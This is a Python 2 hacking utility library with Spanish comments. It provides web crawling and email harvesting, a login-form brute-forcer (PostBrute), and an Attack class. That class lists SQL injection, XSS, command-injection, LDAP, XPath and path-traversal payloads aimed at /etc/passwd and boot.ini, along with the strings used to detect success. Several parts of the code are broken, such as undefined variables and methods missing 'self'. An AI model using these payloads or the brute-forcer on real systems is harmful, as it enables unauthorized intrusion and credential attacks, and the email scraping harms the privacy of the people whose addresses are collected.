#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
# sha0@badchecksum.net
# utils.py  v0.4
# TODO: exceptions control


#Ejemplos:
#
# goo =  Google()
# htm = goo.search('cacatuas')
# p = HtmlParse()
# eml = parse.getEmails(htm)

# nav = Navigator()
# htm = nav.go('www.badchecksum.net')
# p = HtmlParse()
# lnks = p.getLinks(htm)

# c = Crawl('www.badchecksum.net')
# c.go()
# c.saveAll()

# pb = PostBrute()
# pb.setBadGuy('denied')
# pb.getForm('www.victym.com')
# pb.load('/lists/users')
# pb.brute()


import re
import string
import socket
import sys
import curses
import threading
import getopt
import urllib
import urllib2
import mutex
import os
import base64

class Date:
        def __init__(self):
                self.year = self.date('Y')
                self.day = self.date('d')
                self.mon = self.date('m')

        def setDate(d,m,y):
                self.year = y
                self.day = d
                self.mon = m

        def date(fmt):
                o = os.popen('date +%'+fmt,'r')
                year = o.read()[:-1]
                o.close()
                return year

        def cal(year):
                os.popen('cal '+year,'r')




class Navigator:
	def __init__(self,cookie=None):
		self.opn = urllib2.build_opener()
		self.userAgent ='Microsoft Internet Explorer 6.0'
		self.cookie = cookie
		self.auth = None
		self.authHash = None

	def setCookie(self,cookie):
		self.cookie = cookie

	def setProxy(self,host,port,user=None,passwd=None):
		if not user or not passwd:
			l_proxy_support = urllib2.ProxyHandler({"http" : "http://%s:%s" % (host,port)})
		else:
			l_proxy_support = urllib2.ProxyHandler({"http" : "http://%s:%s@%s,%s" % (user,passwd,host,port)})

		self.opn = urllib2.build_opener(l_proxy_support, urllib2.HTTPHandler)

	def setAuth(self,mode,user,passwd):
		self.auth = mode
		self.authHash =  base64.encodestring('%s:%s' % (user, passwd))[:-1]
	
	def go(self,url,postStr=None):

		if postStr:
			req = urllib2.Request(url,postStr)
		else:
			req = urllib2.Request(url)

		req.add_header('User-Agent',self.userAgent)

		if self.cookie:
			req.add_header('Cookie',self.cookie)

		if self.auth:
			req.add_header("Authorization", self.auth+' '+self.authHash)

		try:
			hndl = self.opn.open(req)
			resp = hndl.read()

		#except IOError, e:
		#	if e.code == 401:
		#		self.realm = e.headers['www-authenticate']
		#	resp = ""

		except:
			resp = ""

		return resp


class Google:
	def __init__(self):
		self.URL_BASE = 'http://www.google.com/search?num=100&hl=es&meta=&q='
		self.URL_TRANSLATOR='http://www.google.com/translate_t?langpair='
		self.opn = urllib2.build_opener()
		self.INIT_PAGE = 0 #Can change this from main program
		self.MAX_PAGES = 3
		self.USER_AGENT = 'Microsoft Internet Explorer 6.0'

	def search(self,keyword):
		html = ''
		for page in range(self.INIT_PAGE,((self.MAX_PAGES+1)*100),100):
			target = self.URL_BASE + keyword + '&start=' + str(page)
			req = urllib2.Request(target)
			req.add_header('User-Agent', self.USER_AGENT)
			html += self.opn.open(req).read()

		return html

	def translate(self,txt,pair):
		url = self.URL_TRANSLATOR+pair
		post = 'hl=en&ie=UTF8&text='+txt+'&langpair='+pair
		req = urllib2.Request(url,post)
		req.add_header('User-Agent', self.USER_AGENT)
		htm = self.opn.open(req).read()
		return re.compile('<div id="?\'?result_box"?\'? dir=[^>]+>([^<]*)</div>').findall(htm)[0]

	def translatePage(self,url,pair):
		url = 'http://www.google.com/translate?u='+url+'&langpair='+pair+'&hl=en&ie=UTF8'
		req = urllib2.Request(url)
		req.add_header('User-Agent', self.USER_AGENT)
		return self.opn.open(req).read()

class Url:
	def __init__(self):
		self.url = ''
		self.host = ''
		self.proto = ''
		self.path = ''
		self.cgi = ''
		self.params = []
		self.params2 = {}
	
	def gen(self):
		#TODO:Comprobar más casos				
		self.url = self.proto+'://'+self.host+self.path+self.cgi+'?'
		for p in self.params:
			self.url+=p+'&'
		return self.url

	def set(self,url):
		url = re.compile('&amp;').sub('&',url)
		self.url = url
		self.proto = re.compile('https?').findall(url)[0]
		self.host = re.compile('https?://([^/]+)').findall(url)[0]

		fullPath = re.compile('https?://[^/]+(/[^?]+)').findall(url)
		if len(fullPath)>0:
			p = re.compile('^/.+/').findall(fullPath[0])
			if len(p) > 0:
				self.path = p[0]
			p = re.compile('/([^/]+)$').findall(fullPath[0])[0]
			if len(p) > 0:
				self.cgi = p

		allParams = re.compile('\?(.*)').findall(url)[0]
		if allParams:
			self.params = re.compile('[^&]*=[^&]*').findall(allParams)
			for nom in re.compile('([^&]*)=[^&]*').findall(allParams):
				self.params2[nom] = re.compile(nom+'=([^&]*)').findall(allParams)[0]

class HtmlParse:
	def __init__(self):
		self.bold = re.compile('\</?b\>',re.IGNORECASE)
		self.span = re.compile('</?span>',re.IGNORECASE)
		self.cache = re.compile('\?q=cache:[a-zA-Z]{12,12}:',re.IGNORECASE)
		self.acentoO = re.compile('&#243;',re.IGNORECASE)
		self.related = re.compile('q=related:',re.IGNORECASE)
		self.http = re.compile('u=http',re.IGNORECASE)
		self.lnk = re.compile('https?://[a-zA-Z0-9./&?_=-]+',re.IGNORECASE)
		self.words = re.compile('[a-zA-Z0-9]+',re.IGNORECASE)
		self.emails = re.compile('[áéíóúàòa-zA-Z0-9_.-]+\@[áéíóúàòa-zA-Z0-9]+\.[áéíóúàòa-zA-Z]{1,5}',re.IGNORECASE)
		self.jsComments = re.compile('[^:]//(.*)\r',re.IGNORECASE)
		self.jsComments2 = re.compile('/\*(.*)\*/',re.IGNORECASE)
		self.htmComments = re.compile('<!\-\-(.*)\-\->',re.IGNORECASE)

	def getHrefs(self,html):
		hrefs = re.compile('href=\'([^\']+)\'').findall(html)
		hrefs += re.compile('href=\"([^\"]+)\"').findall(html)
		hrefs += re.compile('href=([^ ]+)').findall(html)
		return hrefs

	def getLinks(self,html,domain):
		html = self.filtered(html)
		lnks = self.lnk.findall(html)

		lnks = self.unique(lnks)
		lnks2 = []
		if domain != '*':
			dom = re.compile(domain)
			for l in lnks:
				if dom.findall(l):
					lnks2.append(l)
		else:
			lnks2=lnks
		return lnks2

	def getComments(self,html):
		#comm = self.jsComments.findall(html)
		comm = self.jsComments2.findall(html)
		#comm += self.htmComments.findall(html)
		return comm

	def getEmails(self,html,domain):
		html = self.filtered(html)
		emls = self.emails.findall(html)
		emls = self.unique(emls)

		eml=[]
		if domain != '*':
			dom = re.compile(domain,re.IGNORECASE)
			for e in emls:
				if dom.findall(e):
					eml.append(e)
		else:
			eml=emls

		return eml

	def getWords(self,html):
		html = self.filtered(html)
		return self.words.findall(html)

	def unique(self,list):
		list.sort()
		list2=[]
		last = ''
		for i in list:
			if i != last:
				list2.insert(-1,i)
			last = i				
		return list2

	def filtered(self,html):
		html = self.bold.sub('',html)
		html = self.span.sub('',html)
		html = self.cache.sub('',html)
		html = self.acentoO.sub('o',html)
		html = self.related.sub('',html)
		html = self.http.sub('http',html)
		return html

class Crawl:
	def __init__(self,web):
		self.web = web
		self.extractSubdmain = re.compile('[a-zA-Z0-9._-]+\.([a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]{1,5})',re.IGNORECASE)
		self.domain = self.extractSubdmain.findall(self.web)
		self.internalLink = re.compile(self.domain[0]+'/',re.IGNORECASE)
		self.regProto = re.compile('https?://',re.IGNORECASE)
		self.nav = Navigator()
		self.parse = HtmlParse()
		self.proto='http://'
		self.html=''
		self.links=[web]
		self.refs=[]	# External links
		self.emails=[]
		self.recursive=100
		#sys.recursionlimit(3000)
		#self.mut = mutex()
		#self.mut.unlock()

	def setCookie(self,cook):
		self.nav.cookie = cook
		

	def go(self):
		#Recursion limits
		self.recursive -= 1
		if self.recursive < 1:
			return

		#Proto prepending if needed
		#if not self.regProto.search(self.web):
		#	print 'NOT PROTO!'
		#	self.web = self.proto+self.web
		
		#Surf	
		print "Analyzing "+self.web
		html = self.nav.go(self.web)

		#Store hmlt and emails
		self.html += "\n\n>>>>"+self.web+"\n"
		self.html += html
		self.emails += self.parse.getEmails(html,'*')

		#Coger links
		links = self.parse.getHrefs(html)


		#Los relativos convertirlos a absolutos
		rLinks=[]
		for l in links:
			if self.internalLink.search(l):
				self.links.append(l)
				rLinks.append(l)
			elif re.compile('https?').search(l):
				self.refs.append(l)
			else:
				host = re.compile('https?://[^/]+/').findall(self.web)[0]
				if l[0] == '/':
					x = re.compile('^/').sub(host,l)
				else:
					x = host+l
				rLinks.append(x)
				

		#Descartar los que ya se hayan crawleado para evitar loops
		for i in self.links:
			for j in rLinks:
				if j == i:
					rLinks.remove(i)
		self.links += rLinks
		print str(len(links))+" links nuevos. "
	

		#Recursion
		try:
			 rLinks.remove(self.web)
		except:
			a=1

		for l in rLinks:
			self.web = l
			self.go()


	def showLinks(self):
		for i in self.links:
			print i

	def showExternalLinks(self):
		for i in self.externLinks:
			print i

	def _save(self,ext,lst):
		lst = self.parse.unique(lst)
		f = open(self.domain[0]+ext,'w')
		for i in lst:
			f.write(i+"\n")
		f.close()
			
	def saveAll(self):
		#Save HTML
		fHtm = open(self.domain[0]+'.html','a')
		fHtm.write(self.html)
		fHtm.close()
		self._save('.lnks',self.links)
		self._save('.refs',self.refs)
		self._save('.emls',self.emails)
		self._save('.comm',self.parse.getComments(self.html))



class Conn:
	def __init__(self):
		self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.buffer = 100;

	def connectSend(self, ip, port, toSend):
		self.sock.connect(ip,port)
		self.sock.send(toSend)
		self.sock.shutdown(1)
		data = self.sock.recv(self.buffer)
		self.sock.close()
		return data

	def connect(self, ip, port):
		try:
			self.sock.connect((ip,port))
			return 1
		except:
			return 0

	def recv(self):
		return self.sock.recv(self.buffer)
		
		
	def send(self, msg):
		self.sock.send(msg)
		return self.sock.recv(666)

	def close(self):
		self.sock.close()


class IRC:
	def __init__(self,server,port):
		self.server = server
		self.port = port
		self.con = Conn()
		self.ident = 'weee'

	def connect(self,user,passwd):
		self.con.connect(self.server,self.port)
		self.con.send('USER '+user+' +ixw '+user+' :'+self.ident+'\n')
		self.con.send('NICK '+user+'\n')

	def join(self,chan,passwd=None):
		if passwd:
			self.con.send('JOIN #'+chan+' :'+passwd+'\n')
		else:
			self.con.send('JOIN #'+chan+'\n')
		
	def part(self,chan):
		self.con.send('PART #'+chan+'\n')	

	def kick(self,chan,nick,why):
		self.con.send('KICK #'+canal+' '+nick+' :'+why+'\n')
		
	def msg(self,chan,msg):	
		self.con.send('PRIVMSG '+chan+' :'+msg+'\n')

	def mode(self,chan,mode,nick):
		self.con.send('MODE '+chan+' '+mode+' '+nick)

	def disconnect(self):
		self.con.close()

#TODO: coger el method post/get
class PostBrute:
	def __init__(self):
		self.opn = urllib2.build_opener()
		self.userAgent ='Microsoft Internet Explorer 6.0'
		self.form = re.compile('</form>',re.IGNORECASE)
		self.action = re.compile('action="?\'?([a-zA-Z0-9_:%?&=/.-]+)',re.IGNORECASE)
		self.param = re.compile('<input([^>]+)>',re.IGNORECASE)
		self.param2 = re.compile('<select([^>]+)>',re.IGNORECASE)
		self.name = re.compile('name="?\'?([a-zA-Z0-9_-]*)',re.IGNORECASE)
		self.fuzzkey = re.compile('%%')
		self.retorno = re.compile('\x0d|\x0a')
		self.value = re.compile('value="?\'?([a-zA-Z0-9_-]*)',re.IGNORECASE)
		self.site = re.compile('https?://[a-zA-Z0-9._:-]+',re.IGNORECASE)
		self.suprime = re.compile('\\\\')
		self.target = ''
		self.params = []
		self.wordlist = []
		self.cookie = ''
		self.method = 'post' #por ahora solo acepta post

	def setCookie(self,cookie):
		self.cookie = cookie

	def setBadGuy(self,bg):
		self.badguy = re.compile(bg,re.IGNORECASE)

	def unique(self,list):
		list.sort()
		list2=[]
		last = ''
		for i in list:
			if i != last:
				list2.insert(-1,i)
			last = i				
		return list2

	def ask(self,msg):
		sys.stdout.write(msg)
		out = sys.stdin.readline()
		return out[0:-1]

	def getForm(self,url):
		initurl = self.site.findall(url)
		req = urllib2.Request(url)
		req.add_header('User-Agent',self.userAgent)
		html = self.opn.open(req).read() 	
		html = self.suprime.sub('',html)
		forms = self.form.findall(html)
		if len(forms) <= 0:
			print 'No forms found!'
			sys.exit(-1)
		if len(forms) > 1:
			count = 1
			for i in forms:
				print "("+str(count)+") "+i
				count += 1
			try:
				form = int(self.ask('%d forms found, wich do you whant? ' % len(forms)))
			except:
				form = 1

			forms  = self.action.findall(html)
			if forms:
				self.target = forms[form-1]
			else:
				self.target = url

		else:

			forms  = self.action.findall(html)
			if forms:
				self.target = forms[0]
			else:
				self.target = url

		if not self.site.match(self.target):
			self.target = ''+initurl[0]+self.target	

		self.getParams(html)

	def getParams(self,html):
		names=[]
		values=[]
		input=0
		params = self.param.findall(html)
		params += self.param2.findall(html)
		for p in self.unique(params):
			n = self.name.findall(p)
			v = self.value.findall(p)
			if len(n)>0:
				if len(v)>0:
					values.append(v[0])
				else:
					values.append('')
					input=1
				names.append(n[0])

		if input:
			print 'Introduce el valor del/los parametro(s), introduce %% para brutearlo:'
		self.params=''
		for p in range(0,len(names)):
			if values[p] == '':
				values[p] = self.ask(str(names[p])+'=')
			self.params += str(names[p])+'='+str(values[p])+'&'

	def load(self,wordlist):
		l = open(wordlist,'r')
		w = l.readlines()
		l.close()
		for i in w:
			x = self.retorno.sub('',i)
			self.wordlist.append(x)

	def brute(self):
		print 'bruteando:\n\n\n'

		for w in self.wordlist:
			param = self.fuzzkey.sub(w,self.params)
			url = self.target+'?'+param
			sys.stdout.write(url+'              \r')
			sys.stdout.flush()
			try:
	                	#req = urllib2.Request(url)Q
				req = urllib2.Request(self.target,param)
                		req.add_header('User-Agent',self.userAgent)
				if self.cookie:
					req.add_header('Cookie:',self.cookie)
                		html = self.opn.open(req).read()
				if not self.badguy.findall(html):
					print 'bypased: '
					#print html
					return
			except ValueError:
				print 'escepcion '+ValueError
				pass

class Attack:
	def __init__(self):
		self.errores = [': No existe','-c: line 0:','-c: line 1:','ORA\-','ODBC','MySQL',' SQL','DB.']
		self.injatt  = '%27%22%25%32%37%25%32%32'
		self.injresp = ['ORA\-','ODBC','MySQL',' SQL']
		self.xssatt  = 'wewe"wewe%27wewe%22wewe>wewe<wewe'
		self.xssresp = ['wewe"wewe','wewe\'wewe','wewe>wewe','wewe<wewe']
		self.cmdsleep  = '|sleep+6+#+$(sleep 6)+#+`sleep 6`;sleep+6+#;'
		self.cmdatt = ['`','|','$(',';;','(','>>','¿?=)(/&%$·"!ª+`:><,.-_;ḉ{}ç+[]']
		self.cmdresp = ['-c: line 0:','-c: line 1:',': No existe',': Not found']
		self.ldapatt = ')(|(cn=*)'
		self.xpathatt = '</xml>]]/\'or 1=1 or \'\'='
		self.xpathresp = ['<\/','\/>']
		self.transatt = ['../../../../../../../../../../etc/passwd','../../../../../../../../../../boot.ini','%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34','%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%32%25%36%66%25%36%66%25%37%34%25%32%65%25%36%39%25%36%65%25%36%39','../../../../../../../../../../etc/passwd%00','../../../../../../../../../../boot.ini%00']
		self.transresp = ['root:0:','\[boot loader\]','root:0','\[boot loader\]','root:0','\[boot loader\]']


class Hping:
	def __init__(self):
		#Resultant data
		self.ttl=0
		self.ip=''
		self.sport=''
		self.flags=''
		self.ipid=0
		#For the parser
		self.getTTL = re.compile(' ttl=([0-9]+)',re.IGNORECASE)
		self.getIP = re.compile(' ip=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)',re.IGNORECASE)
		self.getSport = re.compile(' sport=([0-9]+)',re.IGNORECASE)
		self.getFlags = re.compile(' flags=([A-Z]+)',re.IGNORECASE)
		self.getIPID = re.compile(' id=([0-9]+)',re.IGNORECASE)
		#Tool
		self.base='/usr/sbin/hping3'

	def parse(self,data):
		self.ttl = self.getTTL.findall(resp)
		self.ip = self.getIP.findall(resp)
		self.sport = self.getSport.findall(resp)
		self.flags = self.getFlags.findall(resp)
		self.ipid = self.getIPID.findall(resp)

	def run(self,params):
		o = so.popen(params,'r')
                resp = o.readline()
		o.close()
		self.parse(resp)

	#Methods:

	def syn(self,ip,port,ttl=None):
		hping = self.base+ip+' -S -c 1-p '+str(port)
		if ttl:	
			hping += '-t '+str(ttl)
		hping += ' 2>/dev/null'
		self.run(hping)

	def raw(self,params):
		hping = self.base+params+' 2>/dev/null'
		self.run(hping)
		

class Screen:
	def __init__(self):
		self.scr = curses.initscr()

	def begin(self):
		curses.noecho()
		curses.cbreak() 
		self.scr.keypad(1)

	def end(self):
		curses.echo()
		curses.nocbreak()
		self.scr.keypad(0)
		curses.endwin()

	def msg(self,x,y,txt,mode):
		self.scr.addstr(x,y,txt,mode)
		self.scr.refresh()

	def window(self):
		win = curses.newwin(5,40,20,7)


